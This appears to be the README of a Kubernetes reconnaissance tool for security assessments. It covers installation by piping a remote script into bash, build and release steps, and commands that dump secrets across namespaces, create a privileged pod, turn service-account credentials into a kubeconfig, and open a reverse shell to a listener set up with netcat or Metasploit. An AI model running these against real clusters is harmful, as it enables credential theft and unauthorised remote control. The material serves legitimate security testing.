# flacon

A simple Kubernetes reconnaissance tool for security assessments in containerized environments.

## Features

- **Container Detection**: Automatically detects if running in a container environment
- **Platform Information**: Gathers kernel version, OS details, and architecture
- **Security Assessment**: Checks for privileged access, secrets, and misconfigurations
- **Kubernetes Integration**: Lists secrets, configmaps, and pod creation rights
- **Version Management**: Built-in versioning with detailed build information

## Installation

### Quick Install

```bash
# Install from source (recommended until first release)
curl -sSL https://raw.githubusercontent.com/a1ex-var1amov/flacon/main/scripts/install.sh | bash

# Install to custom directory
curl -sSL https://raw.githubusercontent.com/a1ex-var1amov/flacon/main/scripts/install.sh | bash -s -- -d ~/.local/bin

# Install specific version (when releases are available)
curl -sSL https://raw.githubusercontent.com/a1ex-var1amov/flacon/main/scripts/install.sh | bash -s -- -v v1.0.0
```

> **Note**: The installation script will first try to download from releases, and if none are available, it will automatically build from source. This requires Go to be installed on your system.

### From Source

```bash
# Clone the repository
git clone https://github.com/a1ex-var1amov/flacon.git
cd flacon

# Build the application
make build

# Or use the build script
./scripts/build.sh
```

### Using Make

```bash
# Build for current platform
make build

# Build for all platforms (Linux, macOS, Windows)
make build-all

# Install globally
make install

# Show version information
make version
```

### Using Build Script

```bash
# Build for current platform with auto-detected version
./scripts/build.sh

# Build with specific version
./scripts/build.sh -v 1.0.0

# Build for specific platform and architecture
./scripts/build.sh -p linux -a amd64

# Build for all platforms and architectures
./scripts/build.sh -p all -a all -v 1.0.0

# Build to custom output directory
./scripts/build.sh -o ./binaries
```

### Creating Releases

The release process is fully automated through GitHub Actions:

```bash
# Create and push a new release (triggers automated build and release)
make release VERSION=v1.0.0

# Or use the release script directly
./scripts/release.sh -p v1.0.0

# Dry run to see what would happen
make release-dry VERSION=v1.0.0

# Create release with custom message
./scripts/release.sh -m "Initial release with versioning" -p v1.0.0
```

**What happens automatically:**
1. ✅ Tag is pushed to GitHub
2. ✅ GitHub Actions builds for all platforms (Linux, macOS, Windows)
3. ✅ Creates a GitHub release with all binaries
4. ✅ Generates SHA256 checksums for verification
5. ✅ Uploads everything to the release page

**No manual steps required!** 🎉

## Usage

```bash
# Run full reconnaissance (includes filesystem scanning)
./flacon

# Run quick reconnaissance (skips filesystem scanning)
./flacon quick

# Show version information
./flacon version

# Show help
./flacon --help

# Dump secrets from all accessible namespaces
./flacon dump-secrets

# Create a privileged debug pod
./flacon debug-pod

# Establish reverse shell connection
./flacon reverse-shell 192.168.1.100:4444

# Create kubeconfig from discovered credentials
./flacon kubeconfig
```

### Kubeconfig Creation

The kubeconfig feature extracts the current service account credentials and creates a standard kubeconfig file that can be used with kubectl.

**Usage:**
```bash
# Create kubeconfig with default name (flacon-kubeconfig.yaml)
./flacon kubeconfig

# Create kubeconfig with custom name
./flacon kubeconfig my-kubeconfig.yaml
```

**Features:**
- **Automatic credential extraction** from service account
- **Secure file permissions** (600 - read/write for owner only)
- **Connection testing** to verify the kubeconfig works
- **Permission analysis** to show what operations are allowed
- **Usage instructions** for immediate kubectl usage

**After creating the kubeconfig:**
```bash
# Use the kubeconfig
export KUBECONFIG=flacon-kubeconfig.yaml

# Test connectivity
kubectl get namespaces

# Explore the cluster
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get services --all-namespaces
```

### Reverse Shell Usage

The reverse shell feature provides a robust alternative to netcat with automatic reconnection, TLS support, and better error handling.

**On your Kali Linux machine (listener):**
```bash
# Using netcat (basic)
nc -lvp 4444

# Using the provided test listener (recommended)
python3 scripts/test_listener.py 4444

# Using metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```

**On the target system:**
```bash
# Connect to your listener
./flacon reverse-shell 192.168.1.100:4444
```

**Features:**
- **Automatic reconnection** with exponential backoff
- **TLS support** as fallback if TCP fails
- **Platform detection** and handshake
- **Heartbeat messages** for connection monitoring
- **Special commands**: `ping`, `info`, `exit`
- **Cross-platform** (Windows, Linux, macOS)

### Version Information

The application includes comprehensive version information:

```bash
$ ./flacon version
flacon version 1.0.0
  Commit SHA: a1b2c3d4e5f6...
  Build Time: 2024-01-15_10:30:45
  Go Version: go1.24.4
  OS/Arch:    darwin/arm64
```

## Versioning

### Build-time Version Injection

The application uses Go's `-ldflags` to inject version information at build time:

- **Version**: Set via `VERSION` environment variable or git tags
- **Commit SHA**: Automatically extracted from git
- **Build Time**: Automatically set during build
- **Go Version**: Runtime Go version
- **OS/Arch**: Target platform information

### Version Variables

You can set version information using environment variables:

```bash
# Set specific version
VERSION=1.0.0 make build

# Or use git tags
git tag v1.0.0
make build  # Will use v1.0.0 as version
```

### Cross-platform Building

Build for multiple platforms and architectures:

```bash
# Build for all platforms
make build-all

# Or using the build script
./scripts/build.sh -p all -a all
```

This creates binaries for:
- Linux (amd64, arm64)
- macOS (amd64, arm64)  
- Windows (amd64, arm64)

## Development

### Project Structure

```
flacon/
├── main.go              # Main application entry point
├── version/             # Version management package
│   ├── version.go       # Version information and utilities
│   └── version_test.go  # Version package tests
├── scripts/             # Build and utility scripts
│   ├── build.sh         # Advanced build script
│   └── install.sh       # Installation script
├── .github/workflows/   # GitHub Actions workflows
│   ├── ci.yaml          # Continuous Integration
│   └── release.yaml     # Release automation
├── Makefile             # Build automation
├── go.mod               # Go module definition
├── go.sum               # Go module checksums
└── README.md            # This file
```

### GitHub Actions

The project includes automated workflows:

- **CI Workflow** (`.github/workflows/ci.yaml`): Runs on pull requests and pushes to main branch
  - Tests the code
  - Builds for multiple platforms
  - Uploads build artifacts

- **Release Workflow** (`.github/workflows/release.yaml`): Runs when tags are pushed
  - Builds for all platforms (Linux, macOS, Windows)
  - Creates GitHub releases with binaries
  - Generates checksums for verification
  - Automatically triggered by `make release` or `./scripts/release.sh`

### Adding Version Information to Output

The reconnaissance data can include version information:

```go
// In your ReconData struct
type ReconData struct {
    // ... existing fields ...
    VersionInfo version.Info `json:"version_info" yaml:"version_info"`
}

// In main function
recon.VersionInfo = version.GetVersionInfo()
```

## License

[Add your license information here]

## Contributing

[Add contribution guidelines here]
